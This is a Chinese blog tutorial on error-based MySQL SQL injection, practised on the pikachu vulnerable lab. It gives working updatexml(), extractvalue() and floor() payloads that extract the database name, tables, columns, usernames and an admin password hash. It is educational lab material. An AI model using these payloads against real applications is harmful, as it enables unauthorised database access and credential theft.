---
title: SQL注入之基于函数报错的信息获取
date: 2019-01-07 23:38:28
categories: WEB安全
tags: 靶机实验

---
<blockquote class="blockquote-center">人生舞台的大幕随时都可能拉开，关键是你愿意表演，还是选择躲避。</blockquote>
<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=526668900&auto=1&height=66"></iframe></iframe></div>

### 实验环境:
pikachu靶机
### 基于函数报错的信息获取
1.常用的报错函数updatexml(),extractvalue(),floor()
2.基于函数报错的信息获取(select,insert,update,delete)


### 技巧思路:
在MySQL中使用一些指定的函数来制造报错,从而从报错信息中获取设定的信息
select/insert/update/delete都可以使用报错来获取信息

### 背景条件:
后台没有屏蔽数据库报错信息,在语法发生错误时会输出在前端

### updatexml函数使用方法
updatexml():函数是MySQL对XML文档数据进行查询和修改的XPATH函数
updatexml()函数作用:改变(查找并替换)XML文档中符合条件的节点的值
语法:updatexml(xml_document,xpathstring,new_value)
第一个参数:XML文档的名称
第二个参数:XML文档的位置(路径),通过xpath定位 ,也可以是表达式,那么数据库便会将这个表达式去执行
第三个参数:new_value,string格式,替换查找到的符合条件的
注:xpath定位必须是有效的,否则会发生错误


### 基于updatexml()报错进行信息获取
基于报错信息获取数据,必须要有报错信息的返回
![image](https://wx2.sinaimg.cn/large/0078beR7ly1fyyi6tu63qj313609hmxs.jpg)

我们使用updatexml()函数构造报错,获取数据库信息
使用concat函数将两个字符串一起打印出来,concat中也可以执行表达式(函数)
0x7e:为~的16进制,其目的为避免信息不被系统去掉,将结果构造出完整的字符串
查看其数据库版本信息:
```
123' and updatexml(1,concat(0x7e,version()),0)#
```
![image](https://wx1.sinaimg.cn/large/0078beR7ly1fyyi7hkmtnj30m708q74l.jpg)
查看当前数据库信息:

```
123' and updatexml(1,concat(0x7e,database()),0)#
```
![image](https://ws2.sinaimg.cn/large/0078beR7ly1fyyi81w8e3j30ls08k74k.jpg)

查看当前数据库第一张表:
```
123' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema="pikachu" limit 0,1)),0)#
```
查出第一个表为httpinfo
![image](https://ws3.sinaimg.cn/large/0078beR7ly1fyyicr2lq7j30rz0dbaao.jpg)

依次查询得到的表为httpinfo,membr,message,users,xssblind

查看users表的字段:
```
123' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name="users" limit 0,1)),0)#
```
![image](https://ws2.sinaimg.cn/large/0078beR7ly1fyyieczx8aj30oh0bxdg7.jpg)
得到users表第一个字段为id,第二个字段为username,第三个字段为password,第四个为level

查看用户名
```
123' and updatexml(1,concat(0x7e,(select username from users limit 0,1)),0)#
```
得到users表的用户名分别为:admin,pikachu,test
![image](https://wx1.sinaimg.cn/large/0078beR7ly1fyyifklgyej30ne0be3yu.jpg)

查看其对应的密码
```
123' and updatexml(1,concat(0x7e,(select password from users  where username='admin' limit 0,1)),0)#
```
得到admin用户的经过MD5加密的值,
![image](https://ws1.sinaimg.cn/large/0078beR7ly1fyyighb282j30o008kgm0.jpg)
解密为123456
![image](https://wx4.sinaimg.cn/large/0078beR7ly1fyyignjjvdj30mr08jt9k.jpg)


### extractvalue()函数使用方法
extractvalue()函数:从目标XML中返回包含所查询值的字符串
语法:ExtractValue(xml_document,xpath_string)
第一个参数:XML_document是string格式,为XML文档对象的名称,文中为Doc
第二个参数:XPath_string(Xpath格式的字符串)
XPath定位必须是有效的,否则会发生错误

### 基于updatexml()报错进行信息获取
获取数据库信息:
```
1' and extractvalue (0,concat(0x7e,database()))#
```
![image](https://ws4.sinaimg.cn/large/0078beR7ly1fyyioxufyjj30js0da3yx.jpg)
其后续操作与updatexml函数操作一致,我就不继续写下去啦
### floor()函数使用方法
floor():MySQL中用来取整的函数.
使用floor函数必须要满足三个条件:
其SQL语句中存在count函数,rand函数,group by 这三个值才可以使用
其payload为:
```
xxx' and (select 2 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a )#
```
关于floor报错原理分析请参考此篇文章:
http://blog.51cto.com/chichu/2051375